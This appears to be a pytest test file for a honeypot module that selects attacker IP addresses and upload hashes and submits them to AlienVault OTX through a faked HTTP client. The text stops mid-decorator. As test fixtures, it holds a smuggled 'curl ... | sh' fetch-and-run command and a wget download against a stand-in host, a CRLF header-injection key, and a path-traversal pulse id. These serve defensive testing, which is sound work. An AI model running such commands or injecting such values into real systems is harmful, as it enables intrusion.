"""Indicators to AlienVault OTX (agents/otx.py).

No real network: the HTTP layer is a fake, the resolver answers a documentation address
treated as public, and the time is injected. No real indicators: addresses come from the
documentation ranges and hashes are of test strings.
"""

from __future__ import annotations

import configparser
import datetime
import hashlib
import json
import logging
import os
import socket

import pytest

from agents import otx
from agents.addresses import public_for_tests
from agents.connectors.http import ResponseTooLarge
from agents.ship import EVENTS_FILE
from agents.triage import SIGNAL_ACTIONS, UNVERIFIED_SOURCE, TriageRecord, write_record

UTC = datetime.timezone.utc
NOW = datetime.datetime(2026, 11, 20, 12, 0, tzinfo=UTC)
TODAY = "2026-11-20"
A, B, C, D = "198.51.100.7", "198.51.100.8", "198.51.100.9", "198.51.100.10"
OWN = "203.0.113.10"
V6 = "2001:db8::5"
EDGE = "203.0.113.80"
H1 = hashlib.sha256(b"test upload one").hexdigest()
H2 = hashlib.sha256(b"test upload two").hexdigest()
# Assembled at runtime; a key-shaped literal would trip the secret scanners.
KEY = "".join(["test", "otx", "key", "0123456789"]) * 2
PULSE = "0123456789abcdef01234567"


@pytest.fixture(autouse=True)
def _public():
    with public_for_tests("198.51.100.0/24", "203.0.113.0/24", "2001:db8::/32"):
        yield


def resolver(host, port, proto=0):
    assert host == otx.HOST and port == 443
    return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", (EDGE, port))]


def rec(ip, judgement="MALICIOUS", rid=None, seen=NOW, protocol="ssh", **kw):
    kw.setdefault("auth_successes", 1)
    return TriageRecord(kind="session" if protocol == "ssh" else "campaign",
                        id=rid or f"s-{ip}-{judgement}-{protocol}", protocol=protocol,
                        src_ip=ip, last_seen=seen.isoformat(), intent="RECONNAISSANCE",
                        stage="DISCOVERY", skill="AUTOMATED", judgement=judgement,
                        narrative="x", **kw)


class Fake:
    """Answers in order: (status, body) or an exception; then 200 with a new pulse."""

    def __init__(self, *answers):
        self.answers = list(answers)
        self.calls = []

    def request(self, method, url, headers, body, timeout, address, max_bytes=None):
        self.calls.append({"method": method, "url": url, "headers": dict(headers),
                           "body": json.loads(body), "timeout": timeout, "address": address,
                           "max_bytes": max_bytes})
        got = self.answers.pop(0) if self.answers else (201, created())
        if isinstance(got, BaseException):
            raise got
        return got


def created(pid=PULSE, **kw):
    return json.dumps({"id": pid, "name": "x", "indicators": [], **kw}).encode()


def settings(**kw):
    base = {"enabled": True, "dry_run": False, "secret_env": "WINNIE_OTX_KEY"}
    base.update(kw)
    return otx.OtxSettings(**base)


SEND = settings()


@pytest.fixture
def key(monkeypatch):
    monkeypatch.setenv("WINNIE_OTX_KEY", KEY)
    return KEY


def item(kind, value, protocol="ssh", classes=("logged_in",), seen=NOW):
    return {"type": kind, "indicator": value, "protocol": protocol, "classes": list(classes),
            "last_seen": seen.isoformat()}


def ip(value, **kw):
    return item(otx.IPV4, value, **kw)


def sha(value, **kw):
    kw.setdefault("protocol", "ftp")
    kw.setdefault("classes", ("ftp_upload",))
    return item(otx.SHA256, value, **kw)


def write_candidates(tmp_path, items, **extra):
    path = tmp_path / "bl" / otx.CANDIDATES_FILE
    path.parent.mkdir(parents=True, exist_ok=True)
    doc = {"version": 1, "generated_at": NOW.isoformat(), "indicators": items, **extra}
    path.write_text(json.dumps(doc))
    return path


def submit(tmp_path, fake, s=SEND, now=NOW, networks=(), **kw):
    return otx.run_submit(s, tmp_path / "bl" / otx.CANDIDATES_FILE, tmp_path / "state",
                          list(networks), transport=fake, resolver=resolver, now=now, **kw)


def state(tmp_path):
    return otx.load_state(tmp_path / "state" / otx.STATE_FILE)


def events(tmp_path):
    path = tmp_path / "state" / EVENTS_FILE
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines()]


def cfg(text: str) -> configparser.ConfigParser:
    cp = configparser.ConfigParser()
    cp.read_string(text)
    return cp


# ---- settings --------------------------------------------------------------------------------

def test_off_by_default_and_dry_run_by_default():
    assert not otx.OtxSettings.from_config(cfg("")).enabled
    assert not otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\n")).enabled
    s = otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = true\n"))
    assert s.enabled and s.dry_run and s.submit and s.hashes and not s.public
    assert s.tlp == "green" and s.max_per_run == 200 and s.expiration_days == 30
    assert s.tags == ("honeypot",)


@pytest.mark.parametrize("line", ["url = https://otx.example.com/", "host = otx.example.com",
                                  "base_url = https://otx.example.com"])
def test_the_destination_cannot_be_configured(line):
    for enabled in ("true", "false"):
        with pytest.raises(otx.ConfigError, match="destination is fixed"):
            otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = {enabled}\n{line}\n"))


@pytest.mark.parametrize("line,message", [
    ("enabled = maybe", "enabled"),
    ("dry_run = maybe", "dry_run"),
    ("max_per_run = 0", "max_per_run"),
    ("max_per_run = 501", "max_per_run"),
    ("max_per_day = x", "max_per_day"),
    ("expiration_days = 0", "expiration_days"),
    ("tlp = purple", "tlp"),
    ("pulse_name = <script>", "pulse_name"),
    ("description = line\\nbreak{}", "description"),
    ("tags = Bad Tag!", "tags"),
    ("secret_file = relative/key", "absolute"),
    ("candidates_file = relative.json", "absolute"),
    ("secret_env = not a name", "environment variable"),
])
def test_bad_settings_are_refused_without_echoing_them(line, message):
    head = "" if line.startswith("enabled") else "enabled = true\n"
    with pytest.raises(otx.ConfigError, match=message) as err:
        otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\n{head}{line}\n"))
    value = line.split("=", 1)[1].strip()
    assert value not in str(err.value) or value in ("0", "x")


def test_a_public_pulse_cannot_be_amber_or_red():
    for tlp in ("amber", "red"):
        with pytest.raises(otx.ConfigError, match="public"):
            otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = true\npublic = true\n"
                                            f"tlp = {tlp}\n"))
    s = otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = true\npublic = true\n"
                                        "tlp = white\n"))
    assert s.public and s.tlp == "white"


def test_sending_needs_a_key_source_and_only_one():
    with pytest.raises(otx.ConfigError, match="secret_env or secret_file"):
        otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = true\ndry_run = false\n"))
    with pytest.raises(otx.ConfigError, match="not both"):
        otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = true\nsecret_env = K\n"
                                        "secret_file = /run/otx-key\n"))
    # The writing side needs no key.
    s = otx.OtxSettings.from_config(cfg(f"[{otx.SECTION}]\nenabled = true\ndry_run = false\n"
                                        "submit = false\n"))
    assert not s.submit and not s.dry_run


def test_own_address_is_the_pasv_address():
    assert [str(n) for n in otx.own_networks(cfg(f"[listeners]\nftp_pasv_address = {OWN}\n"))] \
        == [f"{OWN}/32"]
    assert otx.own_networks(cfg("[listeners]\nftp_pasv_address = not-an-address\n")) == []
    assert otx.own_networks(cfg("")) == []


# ---- selection -------------------------------------------------------------------------------

def select(records, networks=(), uploads=(), hashes=True, now=NOW):
    return otx.select_candidates(records, list(networks), now, 7, uploads, hashes)


def values(items):
    return [i["indicator"] for i in items]


@pytest.mark.parametrize("cls,kw", [
    ("logged_in", {"auth_successes": 1}),
    ("honeytoken", {"auth_successes": 0, "honeytokens": ["planted-key"]}),
    *[(name, {"auth_successes": 0, "high_signal": {name: 1}}) for name in otx.ACTIVE_SIGNALS],
])
def test_each_class_qualifies(cls, kw):
    out = select([rec(A, **kw)])
    assert values(out) == [A] and out[0]["classes"] == [cls]


@pytest.mark.parametrize("kw", [
    {"auth_successes": 0, "auth_attempts": 500},
    {"auth_successes": 0, "high_signal": {"ftp_active_mode": 3}},
    {"auth_successes": 0, "high_signal": {"http_proxy_attempt": 1}},
    {"auth_successes": 0, "high_signal": {"made_up_signal": 1}},
    {"auth_successes": 0, "commands": 40},
])
def test_probing_alone_is_not_enough(kw):
    assert select([rec(A, **kw)]) == []


def test_every_class_has_a_fixed_phrase():
    for name in otx.ACTIVE_SIGNALS:
        assert otx.CLASSES[name] == SIGNAL_ACTIONS[name]
    assert set(otx.CLASSES) == {"logged_in", "honeytoken", *otx.ACTIVE_SIGNALS}


def test_the_model_can_only_veto():
    assert select([rec(A, judgement="BENIGN", auth_successes=3)]) == []
    assert values(select([rec(A, judgement="SUSPICIOUS")])) == [A]


@pytest.mark.parametrize("record", [
    rec(A, protocol="sip", unverified_source=True),
    rec(UNVERIFIED_SOURCE, protocol="sip"),
    rec("10.0.0.5"),
    rec("192.168.1.9"),
    rec("100.64.0.9"),
    rec("127.0.0.1"),
    rec("169.254.1.1"),
    rec("224.0.0.9"),
    rec("240.0.0.9"),
    rec("0.0.0.0"),
])
def test_unproven_and_non_global_sources_are_never_chosen(record):
    assert select([record]) == []


def test_never_act_on_and_the_sensor_address_are_excluded():
    import ipaddress

    nets = [ipaddress.ip_network("198.51.100.0/29"), ipaddress.ip_network(f"{OWN}/32")]
    out = select([rec(A), rec(B), rec(OWN)], networks=nets)
    assert values(out) == [B]


def test_ipv6_sources_are_not_submitted_as_addresses():
    assert select([rec(V6)]) == []


def test_a_proven_sip_source_counts():
    # A SIP source that completed a nonce round trip is not unverified.
    out = select([rec(A, protocol="sip", auth_successes=1)])
    assert out[0]["protocol"] == "sip" and out[0]["classes"] == ["logged_in"]


def test_lookback_window():
    old = NOW - datetime.timedelta(days=8)
    assert select([rec(A, seen=old)]) == []
    assert values(select([rec(A, seen=NOW - datetime.timedelta(days=6))])) == [A]


def test_one_entry_per_address_with_classes_merged_in_a_fixed_order():
    later = NOW + datetime.timedelta(minutes=5)
    out = select([rec(A, rid="one", high_signal={"download_execute": 1}),
                  rec(A, rid="two", seen=later, honeytokens=["planted-key"],
                      protocol="ftp", auth_successes=0)])
    assert values(out) == [A]
    assert out[0]["classes"] == ["logged_in", "honeytoken", "download_execute"]
    assert out[0]["last_seen"] == later.isoformat()


def test_attacker_text_never_reaches_a_candidate():
    hostile = rec(A, username="admin; curl http://bad.example.com/x | sh",
                  command_sample=[f"wget http://bad.example.com/{H2}", "echo 192.0.2.99"],
                  iocs=[{"type": "url", "value": "http://bad.example.com/x"},
                        {"type": "sha256", "value": H2},
                        {"type": "ipv4", "value": B}],
                  clients=["evil-client"])
    out = select([hostile])
    assert values(out) == [A]
    blob = json.dumps(out)
    for word in ("example.com", H2, B, "192.0.2.99", "admin", "evil-client", "curl"):
        assert word not in blob


def upload(sha256, src, at=NOW):
    return {"sha256": sha256, "src": src, "stored_at": at}


def test_hashes_of_uploads_from_chosen_sources():
    records = [rec(A, protocol="ftp", auth_successes=0, high_signal={"ftp_upload": 1}),
               rec(B, auth_successes=0, auth_attempts=9)]
    out = select(records, uploads=[upload(H1, A), upload(H2, B)])
    assert [(i["type"], i["indicator"]) for i in out] == [(otx.IPV4, A), (otx.SHA256, H1)]
    assert out[1]["protocol"] == "ftp" and out[1]["classes"] == ["ftp_upload"]
    assert select(records, uploads=[upload(H1, A)], hashes=False) == select(records)


def test_an_ipv6_source_gives_its_upload_hash_but_not_its_address():
    record = rec(V6, protocol="s3", auth_successes=0, high_signal={"s3_upload": 1})
    out = select([record], uploads=[upload(H1, "2001:db8::/64")])
    assert [(i["type"], i["indicator"], i["protocol"]) for i in out] == [(otx.SHA256, H1, "s3")]


def test_an_excluded_source_gives_no_hash():
    import ipaddress

    record = rec(A, protocol="ftp", auth_successes=0, high_signal={"ftp_upload": 1})
    assert select([record], networks=[ipaddress.ip_network(f"{A}/32")],
                  uploads=[upload(H1, A)]) == []


def sidecar(directory, name, **meta):
    directory.mkdir(parents=True, exist_ok=True)
    (directory / f"{name}.bin.json").write_text(json.dumps(meta))


def test_reading_the_quarantine(tmp_path):
    q = tmp_path / "quarantine"
    good = {"sha256": H1, "size": 100, "src": A, "stored_at": "2026-11-20T11:00:00Z"}
    sidecar(q, "a", **good)
    sidecar(q, "cut", **{**good, "sha256": H2, "size": 1000})          # reached the cap
    sidecar(q, "old", **{**good, "sha256": H2, "stored_at": "2026-11-01T00:00:00Z"})
    sidecar(q, "upper", **{**good, "sha256": H2.upper()})
    sidecar(q, "short", **{**good, "sha256": "ab" * 8})
    sidecar(q, "nosize", **{k: v for k, v in good.items() if k != "size"})
    sidecar(q, "boolsize", **{**good, "size": True})
    (q / "junk.bin.json").write_text("{not json")
    (q / "list.bin.json").write_text("[]")
    (q / "huge.bin.json").write_text(json.dumps({**good, "pad": "x" * 5000}))
    os.mkfifo(q / "fifo.bin.json")
    os.symlink(q / "a.bin.json", q / "link.bin.json")
    got = otx.read_uploads(q, 1000, NOW - datetime.timedelta(days=7))
    assert got == [{"sha256": H1, "src": A,
                    "stored_at": datetime.datetime(2026, 11, 20, 11, 0, tzinfo=UTC)}]
    assert otx.read_uploads(tmp_path / "missing", 1000, NOW) == []


def test_write_candidates_and_its_format(tmp_path):
    q = tmp_path / "quarantine"
    sidecar(q, "a", sha256=H1, size=10, src=A, stored_at="2026-11-20T11:00:00Z")
    path = tmp_path / "bl" / otx.CANDIDATES_FILE
    records = [rec(A, protocol="ftp", auth_successes=0, high_signal={"ftp_upload": 1})]
    out = otx.write_candidates(settings(), records, [], path, uploads_dir=q, cap=1000, now=NOW)
    assert out == {"candidates": 2, "dropped_for_size": 0, "addresses": 1, "hashes": 1,
                   "status": "written"}
    doc = json.loads(path.read_text())
    assert set(doc) == {"version", "generated_at", "indicators"}
    assert all(set(i) == {"type", "indicator", "protocol", "classes", "last_seen"}
               for i in doc["indicators"])
    assert oct(path.stat().st_mode & 0o777) == "0o600"
    parsed, excluded = otx.parse_candidates(path.read_bytes(), [])
    assert len(parsed) == 2 and excluded == 0
    dry = otx.write_candidates(settings(), records, [], tmp_path / "other.json", now=NOW,
                               dry_run=True)
    assert dry["dry_run"] and not (tmp_path / "other.json").exists()


def test_write_candidates_with_hashes_off_reads_no_quarantine(tmp_path):
    q = tmp_path / "quarantine"
    sidecar(q, "a", sha256=H1, size=10, src=A, stored_at="2026-11-20T11:00:00Z")
    records = [rec(A, protocol="ftp", auth_successes=0, high_signal={"ftp_upload": 1})]
    out = otx.write_candidates(settings(hashes=False), records, [], tmp_path / "c.json",
                               uploads_dir=q, cap=1000, now=NOW)
    assert out["hashes"] == 0 and out["addresses"] == 1


# ---- the hand-off file -----------------------------------------------------------------------

def doc(items, **extra):
    return json.dumps({"version": 1, "generated_at": NOW.isoformat(), "indicators": items,
                       **extra}).encode()


@pytest.mark.parametrize("body", [
    b"", b"not json", b"[]", b"\xff\xfe",
    json.dumps({"version": 2, "generated_at": NOW.isoformat(), "indicators": []}).encode(),
    json.dumps({"version": True, "generated_at": NOW.isoformat(), "indicators": []}).encode(),
    json.dumps({"version": 1, "generated_at": "yesterday", "indicators": []}).encode(),
    json.dumps({"version": 1, "generated_at": NOW.isoformat(), "indicators": {}}).encode(),
    doc([ip(A)] * 2),
    doc([ip(f"198.51.{i // 256}.{i % 256}") for i in range(otx.MAX_CANDIDATES + 1)]),
    doc(["198.51.100.7"]),
    doc([ip("10.0.0.1")]),
    doc([ip("198.51.100.007")]),
    doc([ip(" 198.51.100.7")]),
    doc([ip("198.51.100.0/24")]),
    doc([ip(V6)]),
    doc([ip("bad.example.com")]),
    doc([ip(7)]),
    doc([sha(H1.upper())]),
    doc([sha(H1[:-1])]),
    doc([sha("http://bad.example.com/x")]),
    doc([item("URL", "http://bad.example.com/x")]),
    doc([item("domain", "bad.example.com")]),
    doc([item("FileHash-MD5", "0" * 32)]),
    doc([ip(A, protocol="gopher")]),
    doc([ip(A, protocol="SSH")]),
    doc([ip(A, classes=())]),
    doc([ip(A, classes=("logged_in", "logged_in"))]),
    doc([ip(A, classes=("free text here",))]),
    doc([{**ip(A), "classes": "logged_in"}]),
    doc([{**ip(A), "last_seen": "soon"}]),
    doc([{**ip(A), "last_seen": None}]),
    b"[" * 100000,
    b" " * (otx.MAX_CANDIDATES_BYTES + 1),
])
def test_a_hostile_candidates_file_is_refused_whole_and_sends_nothing(tmp_path, body, key):
    path = tmp_path / "bl" / otx.CANDIDATES_FILE
    path.parent.mkdir(parents=True)
    path.write_bytes(body)
    fake = Fake()
    out = submit(tmp_path, fake)
    assert fake.calls == [] and "error" in out
    assert out["status"] == "error"


def test_extra_keys_are_never_sent(tmp_path, key):
    write_candidates(tmp_path, [{**ip(A), "title": "attacker title",
                                 "description": "attacker text", "role": "phishing"}],
                     note="attacker text")
    fake = Fake()
    assert submit(tmp_path, fake)["sent"] == 1
    blob = json.dumps(fake.calls[0]["body"])
    assert "attacker" not in blob and "phishing" not in blob


def test_never_act_on_is_applied_again_when_read(tmp_path, key):
    import ipaddress

    write_candidates(tmp_path, [ip(A), ip(B), ip(OWN)])
    fake = Fake()
    out = submit(tmp_path, fake, networks=[ipaddress.ip_network(f"{A}/32"),
                                           ipaddress.ip_network(f"{OWN}/32")])
    assert out["skipped"]["excluded"] == 2 and out["sent"] == 1
    assert [i["indicator"] for i in fake.calls[0]["body"]["indicators"]] == [B]


def test_a_fifo_or_a_link_in_place_of_the_file_neither_blocks_nor_is_followed(tmp_path, key):
    real = write_candidates(tmp_path, [ip(A)])
    moved = tmp_path / "real.json"
    real.rename(moved)
    os.symlink(moved, real)
    fake = Fake()
    assert submit(tmp_path, fake)["status"] == "error" and fake.calls == []
    real.unlink()
    os.mkfifo(real)
    assert submit(tmp_path, fake)["status"] == "error" and fake.calls == []


def test_no_candidates_file_yet_is_not_an_error(tmp_path, key):
    fake = Fake()
    out = submit(tmp_path, fake)
    assert out["status"] == "no candidates file yet" and "error" not in out
    assert fake.calls == []


# ---- the request -----------------------------------------------------------------------------

def test_create_request_shape(tmp_path, key):
    write_candidates(tmp_path, [ip(A, classes=("logged_in", "download_execute")),
                                sha(H1)])
    fake = Fake()
    out = submit(tmp_path, fake)
    assert out["status"] == "done" and out["sent"] == 2 and out["pulse"] == "created"
    call = fake.calls[0]
    assert call["method"] == "POST"
    assert call["url"] == "https://otx.alienvault.com/api/v1/pulses/create"
    assert call["address"] == EDGE and call["timeout"] == otx.TIMEOUT
    assert call["max_bytes"] == otx.MAX_BODY
    assert call["headers"] == {"User-Agent": otx.USER_AGENT, "Accept": "application/json",
                               "Content-Type": "application/json", "X-OTX-API-KEY": KEY}
    body = call["body"]
    assert body == {
        "name": f"Honeypot sources {TODAY}", "description": otx.DEFAULT_DESCRIPTION,
        "public": False, "TLP": "green", "tags": ["honeypot"], "references": [],
        "indicators": [
            {"indicator": A, "type": "IPv4", "title": "Honeypot source over SSH",
             "description": "Source address seen on a honeypot over SSH. Logged in or "
                            "registered; Tried to fetch a file and run it.",
             "expiration": "2026-12-20T12:00:00"},
            {"indicator": H1, "type": "FileHash-SHA256",
             "title": "File uploaded to a honeypot over FTP",
             "description": "SHA-256 of a file a honeypot source uploaded over FTP. The "
                            "source: Sent a file over FTP.",
             "expiration": "2026-12-20T12:00:00"}]}
    assert state(tmp_path)["pulse_id"] == PULSE and state(tmp_path)["pulse_day"] == TODAY


def test_config_shapes_the_pulse(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake()
    s = settings(pulse_name="Sensor seven", description="Seen on a sensor.",
                 tags=("honeypot", "ssh"), tlp="white", public=True, expiration_days=3)
    submit(tmp_path, fake, s=s)
    body = fake.calls[0]["body"]
    assert (body["name"], body["description"], body["tags"], body["TLP"], body["public"]) == \
        (f"Sensor seven {TODAY}", "Seen on a sensor.", ["honeypot", "ssh"], "white", True)
    assert body["indicators"][0]["expiration"] == "2026-11-23T12:00:00"


def test_create_then_append_then_nothing_twice(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake()
    submit(tmp_path, fake)
    write_candidates(tmp_path, [ip(A), ip(B), sha(H1)])
    out = submit(tmp_path, fake, now=NOW + datetime.timedelta(hours=1))
    assert out["sent"] == 2 and out["skipped"]["already_sent"] == 1 and out["pulse"] == "appended"
    call = fake.calls[1]
    assert call["method"] == "PATCH"
    assert call["url"] == f"https://otx.alienvault.com/api/v1/pulses/{PULSE}"
    assert set(call["body"]) == {"indicators"} and set(call["body"]["indicators"]) == {"add"}
    assert [i["indicator"] for i in call["body"]["indicators"]["add"]] == [B, H1]
    out = submit(tmp_path, fake, now=NOW + datetime.timedelta(hours=2))
    assert out["status"] == "nothing new" and len(fake.calls) == 2
    assert out["skipped"]["already_sent"] == 3


def test_a_new_utc_day_creates_a_new_pulse(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake((201, created(PULSE)), (201, created("abcdefabcdefabcdefabcdef")))
    submit(tmp_path, fake, now=datetime.datetime(2026, 11, 20, 23, 59, tzinfo=UTC))
    write_candidates(tmp_path, [ip(A), ip(B)])
    out = submit(tmp_path, fake, now=datetime.datetime(2026, 11, 21, 0, 1, tzinfo=UTC))
    assert out["pulse"] == "created" and fake.calls[1]["method"] == "POST"
    assert fake.calls[1]["body"]["name"] == "Honeypot sources 2026-11-21"
    assert [i["indicator"] for i in fake.calls[1]["body"]["indicators"]] == [B]
    st = state(tmp_path)
    assert st["pulse_id"] == "abcdefabcdefabcdefabcdef" and st["day"] == "2026-11-21"
    assert st["day_count"] == 1


def test_per_run_cap(tmp_path, key):
    write_candidates(tmp_path, [ip(f"198.51.100.{i}") for i in range(1, 11)])
    fake = Fake()
    out = submit(tmp_path, fake, s=settings(max_per_run=4))
    assert out["sent"] == 4 and out["skipped"]["over_cap"] == 6
    assert len(fake.calls[0]["body"]["indicators"]) == 4
    out = submit(tmp_path, fake, s=settings(max_per_run=4))
    assert out["sent"] == 4 and out["skipped"]["already_sent"] == 4


def test_per_day_cap_and_the_next_day(tmp_path, key):
    write_candidates(tmp_path, [ip(f"198.51.100.{i}") for i in range(1, 11)])
    fake = Fake()
    s = settings(max_per_run=4, max_per_day=6)
    assert submit(tmp_path, fake, s=s)["sent"] == 4
    assert submit(tmp_path, fake, s=s)["sent"] == 2
    out = submit(tmp_path, fake, s=s)
    assert out["status"] == "daily cap reached" and len(fake.calls) == 2
    out = submit(tmp_path, fake, s=s, now=NOW + datetime.timedelta(days=1))
    assert out["sent"] == 4


def test_hashes_can_be_switched_off_when_sending(tmp_path, key):
    write_candidates(tmp_path, [ip(A), sha(H1)])
    fake = Fake()
    out = submit(tmp_path, fake, s=settings(hashes=False))
    assert out["sent"] == 1 and out["skipped"]["hashes_off"] == 1
    assert [i["type"] for i in fake.calls[0]["body"]["indicators"]] == ["IPv4"]


def test_submit_false_never_reads_or_sends(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake()
    out = submit(tmp_path, fake, s=settings(submit=False))
    assert "submit = false" in out["status"] and fake.calls == []
    assert submit(tmp_path, fake, s=otx.OtxSettings())["status"] == "disabled"


def test_pinned_addresses_only(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    pinned = tmp_path / "otx-addresses"
    pinned.write_text("203.0.113.90\n203.0.113.91\n")
    fake = Fake()
    submit(tmp_path, fake, s=settings(addresses_file=str(pinned)))
    # The name resolves to an address that is not pinned: the first pinned one is used.
    assert fake.calls[0]["address"] == "203.0.113.90"
    write_candidates(tmp_path, [ip(B)])
    pinned.write_text("10.0.0.1\n")
    out = submit(tmp_path, Fake(), s=settings(addresses_file=str(pinned)))
    assert "no pinned OTX address" in out["error"]
    pinned.unlink()
    out = submit(tmp_path, Fake(), s=settings(addresses_file=str(pinned)))
    assert "no pinned OTX address" in out["error"]


# ---- failures and back-off -------------------------------------------------------------------

@pytest.mark.parametrize("failure", [
    (429, b"slow down"), (500, b""), (502, b"<html>"), (503, b""),
    (301, b""), (302, b""), (307, b""),
    (400, b'{"detail": "bad"}'), (401, b""), (403, b'{"detail": "Authentication"}'),
    ConnectionRefusedError("refused"), TimeoutError("slow"), OSError("tls"),
])
def test_a_failure_stops_backs_off_and_sends_nothing_twice(tmp_path, key, failure):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake(failure)
    out = submit(tmp_path, fake)
    assert out["status"] == "stopped" and out["failed"] == 1 and out["sent"] == 0
    assert out["backoff_minutes"] == 15
    st = state(tmp_path)
    assert st["sent"] == {} and st["backoff_until"] == NOW + datetime.timedelta(minutes=15)
    assert len(fake.calls) == 1           # no redirect followed, no retry within the run
    out = submit(tmp_path, fake, now=NOW + datetime.timedelta(minutes=5))
    assert out["status"] == "backing off" and len(fake.calls) == 1
    out = submit(tmp_path, fake, now=NOW + datetime.timedelta(minutes=16))
    assert out["status"] == "done" and out["sent"] == 1


def test_back_off_doubles_up_to_a_day(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    now = NOW
    minutes = []
    for _ in range(9):
        out = submit(tmp_path, Fake((503, b"")), now=now)
        minutes.append(out["backoff_minutes"])
        now += datetime.timedelta(minutes=out["backoff_minutes"] + 1)
    assert minutes == [15, 30, 60, 120, 240, 480, 960, 1440, 1440]


def test_a_back_off_too_far_ahead_is_ignored(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    path = tmp_path / "state" / otx.STATE_FILE
    path.parent.mkdir(parents=True)
    path.write_text(json.dumps({"version": 1, "backoff_until": "2030-01-01T00:00:00+00:00",
                                "backoff_minutes": 15, "sent": {}}))
    assert submit(tmp_path, Fake())["sent"] == 1


def test_a_missing_pulse_is_forgotten_and_created_next_run(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake((201, created()), (404, b""), (201, created("fedcbafedcbafedcbafedcba")))
    submit(tmp_path, fake)
    write_candidates(tmp_path, [ip(A), ip(B)])
    out = submit(tmp_path, fake)
    assert out["status"] == "stopped" and "pulse not found" in out["stopped"]
    assert "backoff_minutes" not in out and state(tmp_path)["pulse_id"] is None
    out = submit(tmp_path, fake)
    assert fake.calls[2]["method"] == "POST" and out["sent"] == 1


@pytest.mark.parametrize("body", [
    b"", b"not json", b"[]", b'"0123456789abcdef01234567"', b'{"id": 12345}',
    b'{"id": null}', b'{"id": ["0123456789abcdef01234567"]}', b'{"id": "short"}',
    b'{"id": "0123456789abcdef0123456789"}', b'{"id": "../../users/me/aaaaaaaaaa"}',
    b'{"id": "0123456789abcdef0123456\\n"}', b'{"no_id": true}', b"{" * 5000,
])
def test_a_hostile_create_answer_keeps_no_id_and_sends_nothing_twice(tmp_path, key, body):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake((201, body))
    out = submit(tmp_path, fake)
    assert out["sent"] == 1 and "id not kept" in out["pulse"]
    st = state(tmp_path)
    assert st["pulse_id"] is None and list(st["sent"]) == [f"IPv4|{A}"]
    # The next run creates a pulse for the rest; A is not sent again.
    write_candidates(tmp_path, [ip(A), ip(B)])
    submit(tmp_path, fake)
    assert fake.calls[1]["method"] == "POST"
    assert [i["indicator"] for i in fake.calls[1]["body"]["indicators"]] == [B]


def test_an_oversized_answer_is_not_read(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake(ResponseTooLarge())
    out = submit(tmp_path, fake)
    assert out["sent"] == 1 and "id not kept" in out["pulse"]
    assert state(tmp_path)["pulse_id"] is None
    # On append, the answer is not needed at all.
    fake = Fake((201, created()), ResponseTooLarge())
    write_candidates(tmp_path, [ip(B)])
    submit(tmp_path, fake)
    write_candidates(tmp_path, [ip(C)])
    out = submit(tmp_path, fake)
    assert out["sent"] == 1 and out["pulse"] == "appended"


def test_only_the_id_of_the_answer_is_kept(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    submit(tmp_path, Fake((201, created(author_name="someone", name="attacker text",
                                         references=["http://bad.example.com"]))))
    text = (tmp_path / "state" / otx.STATE_FILE).read_text()
    assert PULSE in text and "someone" not in text and "attacker" not in text \
        and "example.com" not in text


# ---- dry run ---------------------------------------------------------------------------------

def test_config_dry_run_writes_what_would_be_sent_and_sends_nothing(tmp_path, monkeypatch):
    monkeypatch.delenv("WINNIE_OTX_KEY", raising=False)
    write_candidates(tmp_path, [ip(A), sha(H1)])
    fake = Fake()
    out = submit(tmp_path, fake, s=settings(dry_run=True))
    assert fake.calls == [] and out["would_send"] == 2 and out["dry_run"]
    preview = json.loads((tmp_path / "state" / otx.DRY_RUN_FILE).read_text())
    assert preview["request"] == "POST https://otx.alienvault.com/api/v1/pulses/create"
    assert [i["indicator"] for i in preview["body"]["indicators"]] == [A, H1]
    assert state(tmp_path)["sent"] == {}
    assert not (tmp_path / "state" / otx.STATE_FILE).exists()
    # Turning sending on later sends the same indicators.
    monkeypatch.setenv("WINNIE_OTX_KEY", KEY)
    assert submit(tmp_path, fake)["sent"] == 2


def test_cli_dry_run_writes_nothing(tmp_path, key):
    write_candidates(tmp_path, [ip(A)])
    fake = Fake()
    out = submit(tmp_path, fake, cli_dry_run=True)
    assert out["status"] == "dry run" and out["would_send"] == 1 and fake.calls == []
    assert not (tmp_path / "state").exists()


# ---- the key ---------------------------------------------------------------------------------

def test_a_missing_or_bad_key_sends_nothing(tmp_path, monkeypatch):
    write_candidates(tmp_path, [ip(A)])
    monkeypatch.delenv("WINNIE_OTX_KEY", raising=False)
    fake = Fake()
    out = submit(tmp_path, fake)
    assert out["error"] == "API key missing; nothing sent" and fake.calls == []
    monkeypatch.setenv("WINNIE_OTX_KEY", "short")
    assert submit(tmp_path, fake)["error"] == "API key not a valid key; nothing sent"
    monkeypatch.setenv("WINNIE_OTX_KEY", KEY + "\r\nX-Injected: 1")
    assert "not a valid key" in submit(tmp_path, fake)["error"] and fake.calls == []


def test_the_key_from_a_file(tmp_path):
    write_candidates(tmp_path, [ip(A)])
    path = tmp_path / "otx-key"
    path.write_text(KEY + "\n")
    fake = Fake()
    assert submit(tmp_path, fake, s=settings(secret_env=None, secret_file=str(path)))["sent"] == 1
    assert fake.calls[0]["headers"]["X-OTX-API-KEY"] == KEY


@pytest.mark.parametrize("failure", [None, (403, KEY.encode()), OSError(f"boom {KEY}"),
                                     ResponseTooLarge(KEY)])
